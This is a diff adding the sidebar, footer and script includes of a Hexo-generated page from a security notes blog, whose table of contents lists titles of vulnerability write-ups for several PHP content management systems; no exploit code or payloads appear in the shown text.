+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#20180308-ThinkSNS-V4-任意文件下载漏洞导致Getshell"><span class="nav-number">1.</span> <span class="nav-text">20180308 ThinkSNS_V4 任意文件下载漏洞导致Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20180307-Z-Blog-1-5-1-1740-bugs"><span class="nav-number">2.</span> <span class="nav-text">20180307 Z-Blog_1.5.1.1740_bugs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20180308-DedeCMS-V5-7-SP2后台存在代码执行漏洞"><span class="nav-number">3.</span> <span class="nav-text">20180308 DedeCMS V5.7 SP2后台存在代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞详情"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞修复"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20180319【代码审计】CLTPHP-v5-5-3-任意文件上传漏洞"><span class="nav-number">4.</span> <span class="nav-text">20180319【代码审计】CLTPHP_v5.5.3 任意文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议"><span class="nav-number">4.3.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20180322-MIPCMS-远程写入配置文件Getshell"><span class="nav-number">5.</span> <span class="nav-text">20180322 MIPCMS 远程写入配置文件Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#代码分析"><span class="nav-number">5.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#CMS-重装"><span class="nav-number">5.2.1.</span> <span class="nav-text">CMS 重装</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#远程写入配置文件Getshell"><span class="nav-number">5.2.2.</span> <span class="nav-text">远程写入配置文件Getshell</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
